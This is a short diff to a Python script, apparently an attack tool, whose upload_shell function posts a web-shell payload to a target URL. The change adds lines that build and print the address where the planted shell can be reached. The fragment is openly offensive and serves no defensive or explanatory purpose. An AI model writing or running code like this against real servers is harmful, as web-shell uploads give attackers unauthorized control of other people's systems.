@@ -20,6 +20,8 @@ def upload_shell(url, payload, upload_path):
     response = requests.post(url, files=files)
     if response.status_code == 200:
         print(f"Shell uploaded successfully to {upload_path}")
+        shell_url = f"{url.rstrip('/')}/{upload_path.lstrip('/')}"
+        print(f"Shell can be accessed at: {shell_url}")
     else:
         print(f"Failed to upload shell: {response.status_code}")
 
